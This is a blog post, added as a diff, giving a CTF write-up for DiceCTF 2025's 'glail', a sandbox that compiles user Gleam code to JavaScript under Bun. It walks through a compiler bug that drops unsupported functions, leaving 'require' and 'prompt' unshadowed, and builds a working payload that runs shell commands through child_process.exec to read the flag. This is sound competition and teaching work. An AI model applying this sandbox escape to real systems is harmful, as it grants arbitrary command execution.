@@ -1,0 +1,438 @@
+---
+layout: post
+title: "glail - dicequals 2025"
+date: 2025-03-28 21:00:00
+categories: writeups
+tags: misc jail gleam 2025
+excerpt: "> pub fn main() { \"⭐\" }"
+mathjax: false
+---
+* content
+{:toc}
+
+*by CygnusX with collaboration from Athryx*
+
+**Author**: BrownieInMotion
+
+### Challenge Description
+> pub fn main() { "⭐" }
+
+---
+
+We are given the following `challenge.js` alongside the source for `gleam-wasm` version `1.5.1`.
+```js
+#!/usr/bin/env bun
+
+import init, * as wasm from './gleam/gleam_wasm.js'
+
+void (async () => {
+    const lines = [prompt('>>> ')]
+    while (lines.at(-1)) lines.push(prompt('>>> '))
+    const program = lines.join('\n')
+
+    if (program.includes('import')) return console.log('no imports')
+    if (program.includes('@')) return console.log('no externals')
+
+    await init({})
+
+    wasm.initialise_panic_hook();
+    wasm.write_module(0, 'mod', program);
+    wasm.compile_package(0, 'javascript')
+
+    const compiled = wasm.read_compiled_javascript(0, 'mod')
+    const blob = new Blob([compiled], { type: 'application/javascript' })
+    console.log(compiled)
+    const url = URL.createObjectURL(blob)
+    const module = await import(url)
+
+    if (module.main) console.log(module.main())
+    else console.log('nothing to do')
+})()
+```
+
+The program reads in lines of text, verifies that we did not use `import` or `@`, builds and compiles a [gleam](https://gleam.run/) module, and compiles to javascript.
+
+The javascript module is imported, and if it contains a `main` function, it is executed.
+
+Before working on this challenge I had virtually no knowledge of `Gleam` (Just enough to know it was a programming language 😭). So my first steps were to understand what was even going on.
+
+Reading through the [gleam language overview](https://tour.gleam.run/everything/), we can define a `main` function that prints "Hello World!" as follows:
+```elixir
+import gleam/io
+pub fn main() {
+    io.println("Hello, Joe!")
+}
+```
+Through the docs, I come to realize that `gleam` on its own is a very small language and almost everything requires some sort of `import` (which is banned). This is problematic as `gleam` doesn't seem to have any alternative to the import keyword for importing external modules.
+
+`Gleam` also has [external functions and external types](https://tour.gleam.run/everything/#advanced-features-externals) which can allow us to call code written in `non-gleam` eg: js or erlang. 
+
+```js
+// An external function that creates an instance of the type
+@external(javascript, "./my_package_ffi.mjs", "now")
+```
+
+This uses the banned `@` character so it turns out to be a dead end.
+
+I decided to take a step back, and look at some of the details in the files that were provided. Looking through the provided `package-lock.json` we can see the `gleam` version they used is `1.5.1`:
+```json
+{
+  "name": "gleam-wasm",
+  "version": "1.5.1",
+  "lockfileVersion": 3,
+  "requires": true,
+  "packages": {
+    "": {
+      "name": "gleam-wasm",
+      "version": "1.5.1",
+      "license": "SEE LICENSE IN LICENCE"
+    }
+  }
+}
+```
+The latest `gleam` version as of writing this is `1.9.1`. Since our `gleam` compiler compiles to javascript, I wondered if they had patched some compiler output bug which would let us import some kind of `gleam` or even `js` module.
+
+To me, the author of the challenge would probably put the version one version before the bug was patched, so I focused my attention on [v1.6](https://github.com/gleam-lang/gleam/blob/main/changelog/v1.6.md).
+
+An interesting patch found in v1.6's changelog:
+![bug](https://gist.github.com/user-attachments/assets/332ab9fb-c5e6-41be-87b9-3580583b37c1)
+
+So `gleam` escapes certain keywords when compiling to js. This makes sense from a compiler standpoint as we don't want to override js keywords or builtins.
+
+I tested this behavior myself on some obvious keywords:
+
+```rs
+pub fn eval() {}
+pub fn main() {
+    eval()
+}
+```
+compiles to
+```js
+import { makeError } from "./gleam.mjs";
+
+export function eval$() {
+  throw makeError(
+    "todo",
+    "mod",
+    1,
+    "eval",
+    "`todo` expression evaluated. This code has not yet been implemented.",
+    {}
+  )
+}
+
+export function main() {
+  return eval$();
+}
+```
+So the function `eval` is escaped to `eval$`.
+
+Checking the `gleam` [source](https://github.com/gleam-lang/gleam/blob/v1.5.1/compiler-core/src/javascript.rs#L682) we find a list of all escaped names.
+
+```rs
+"await"
+| "arguments"
+| "break"
+| "case"
+| "catch"
+| "class"
+| "const"
+| "continue"
+| "debugger"
+| "default"
+| "delete"
+| "do"
+| "else"
+| "enum"
+| "export"
+| "extends"
+| "eval"
+| "false"
+| "finally"
+| "for"
+| "function"
+| "if"
+| "implements"
+| "import"
+| "in"
+| "instanceof"
+| "interface"
+| "let"
+| "new"
+| "null"
+| "package"
+| "private"
+| "protected"
+| "public"
+| "return"
+| "static"
+| "super"
+| "switch"
+| "this"
+| "throw"
+| "true"
+| "try"
+| "typeof"
+| "var"
+| "void"
+| "while"
+| "with"
+| "yield"
+// `undefined` to avoid any unintentional overriding.
+| "undefined"
+// `then` to avoid a module that defines a `then` function being
+// used as a `thenable` in JavaScript when the module is imported
+// dynamically, which results in unexpected behaviour.
+// It is rather unfortunate that we have to do this.
+| "then"
+```
+
+Looking back at the challenge source, I noticed the script runs using [bun.js](https://bun.sh/):
+```sh
+#!/usr/bin/env bun
+```
+
+We noticed that many `bun` specific global functions aren't escaped.
+
+The function `prompt` which prompts for user input is an easy one to get a small PoC working on.
+
+The following gleam code
+```rs
+fn prompt() { 
+    
+}
+pub fn main() {
+    prompt()
+}
+```
+compiles to
+```js
+import { makeError } from "./gleam.mjs";
+
+function prompt() {
+  throw makeError(
+    "todo",
+    "mod",
+    1,
+    "prompt",
+    "`todo` expression evaluated. This code has not yet been implemented.",
+    {}
+  )
+}
+
+export function main() {
+  return prompt();
+}
+```
+
+Ok this does not work. Why? Because we overwrite the prompt function ourselves, so even though it doesn't get escaped, we need to find a way to not declare it.
+
+Looking back through the patch notes for v1.6 we come across another curious thing:
+![bug2](https://gist.github.com/user-attachments/assets/ebe22fcb-7887-430e-b687-0f91869eabac)
+
+My teammate, Athryx found that it gets fixed [in this commit](https://github.com/gleam-lang/gleam/commit/316df944acf2acab4b2160c2af92456c84a806f6).
+
+So when using unsupported features the WASM compiler might return incomplete js.
+
+The commit adds the following [test](https://github.com/gleam-lang/gleam/commit/316df944acf2acab4b2160c2af92456c84a806f6#diff-7f9764d79824271ef56957c58f9f2422bf9704fa9b3fabbcdf78b41a289b9944) to make sure the fix works. 
+Grabbing the code from the test:
+```rs
+fn wibble() { 
+    <<0:16-native>>
+}
+pub fn main() {
+    wibble()
+}
+```
+and putting it into the 1.5.1 compiler, produces:
+```js
+import { toBitArray } from "./gleam.mjs";
+
+export function main() {
+  return wibble();
+}
+```
+
+Looks like the entire `wibble` function has been deleted since non byte aligned bitarrays are unsupported in js.
+
+We can make use of this with the `prompt` function from earlier:
+```rs
+fn prompt() {
+    <<0:16-native>>
+}
+pub fn main() {
+    prompt()
+}
+```
+which compiles to
+```js
+import { toBitArray } from "./gleam.mjs";
+
+export function main() {
+  return prompt();
+}
+```
+Running this on remote as a proof of concept:
+
+![poc1](https://gist.github.com/user-attachments/assets/d8ea4d02-f3ce-48a8-bdbf-dc6a1836d82c)
+
+### Execution of disallowed function
+
+The next step is to find a function in `bun`'s [globals](https://bun.sh/docs/api/globals) that we can call to execute some shell commands. 
+
+A quite obvious one is `require` which lets us import arbitrary modules.
+
+A common javascript payload for executing shell commands is to use:
+```js
+require("child_process").exec(cmd, callback)
+```
+This executes a shell command stored in `cmd`, and calls the function with the command's `error` `stdout` and `stderr`. 
+
+Now we have to find some way to trick the compiler into thinking that the output of `require("child_process")` has an `exec` attribute.
+
+First, we need to make the compiler **think** that the return value of `require` is a type that has an attribute `exec`. The following achieves this:
+
+```rs
+pub type Mod {
+  Mod(exec: Nil)
+}
+pub fn require(a: String) -> Mod {
+  let a = <<0:16-native>>
+  Mod(Nil)
+}
+fn prompt(a: String) -> String {
+  let a = <<0:16-native>>
+  "a"
+}
+pub fn main() {
+  let mod = require("child_process").exec
+}
+```
+which compiles to:
+```js
+import { CustomType as $CustomType, toBitArray } from "./gleam.mjs";
+
+export class Mod extends $CustomType {
+  constructor(exec) {
+    super();
+    this.exec = exec;
+  }
+}
+
+export function main() {
+  let mod = require("child_process").exec;
+  return mod;
+}
+```
+
+We can see the `prompt` and `require` functions are deleted because the wasm compiler sets the mode for unsupported features to ignore instead of error as explained above.
+
+So now we have a valid `exec` attribute, but we want this attribute to be a function that takes in two parameters: a String and a Callback function to match the signature of javascript's `require('child_process').exec` function. We can achieve this by making `exec` be a function type.
+
+```rs
+pub type Mod {
+  Mod(exec: fn(String, fn(String, String, String) -> String) -> String)
+}
+pub fn require(a: String) -> Mod {
+  let a = <<0:16-native>>
+  Mod(fn(b: String, c: fn(String, String, String) -> String) { "" })
+}
+fn prompt(a: String) -> String {
+  let a = <<0:16-native>>
+  "a"
+}
+pub fn main() {
+  let mod = require("child_process").exec("ls", fn(a:String, b: String, c: String) -> String {"a"})
+}
+```
+
+which compiles to
+
+```js
+import { CustomType as $CustomType, toBitArray } from "./gleam.mjs";
+
+export class Mod extends $CustomType {
+  constructor(exec) {
+    super();
+    this.exec = exec;
+  }
+}
+
+export function main() {
+  let mod = require("child_process").exec("ls", (a, b, c) => { return "a"; });
+  return mod;
+}
+```
+
+This passes `gleam`'s type checker and now we just need to construct the callback function which prints `stdout`. The `prompt` function from earlier prompts the user with a string passed in as the first argument. We can use this as a printing function.
+
+The function `print_out` calls `prompt` with the stdout of the executed command.
+
+Now our payload looks like this:
+```rs
+pub type Mod {
+  Mod(exec: fn(String, fn(String, String, String) -> String) -> String)
+}
+pub fn require(a: String) -> Mod {
+  let a = <<0:16-native>>
+  Mod(fn(b: String, c: fn(String, String, String) -> String) { "" })
+}
+fn print_out(err: String, stdout: String, stderr: String) {
+  prompt(stdout)
+}
+fn prompt(a: String) -> String {
+  let a = <<0:16-native>>
+  "a"
+}
+pub fn main() {
+  let mod = require("child_process").exec("ls", print_out)
+}
+```
+
+which compiles to
+```js
+import { CustomType as $CustomType, toBitArray } from "./gleam.mjs";
+
+export class Mod extends $CustomType {
+  constructor(exec) {
+    super();
+    this.exec = exec;
+  }
+}
+
+function print_out(err, stdout, stderr) {
+  return prompt(stdout);
+}
+
+export function main() {
+  let mod = require("child_process").exec("ls", print_out);
+  return mod;
+}
+```
+
+Running this on remote we get the output of `ls` and the challenge is solved!
+
+## Final payload
+```rs
+pub type Mod {
+  Mod(exec: fn(String, fn(String, String, String) -> String) -> String)
+}
+pub fn require(a: String) -> Mod {
+  let a = <<0:16-native>>
+  Mod(fn(b: String, c: fn(String, String, String) -> String) { "" })
+}
+fn print_out(err: String, stdout: String, stderr: String) {
+  prompt(stdout)
+}
+fn prompt(a: String) -> String {
+  let a = <<0:16-native>>
+  "a"
+}
+pub fn main() {
+  let mod = require("child_process").exec("cat flag.txt", print_out)
+}
+```
+*Special thanks to my teammate Athryx who exploited the unsupported features bug*
+
+> dice{5f45c2d75de6c5ee}
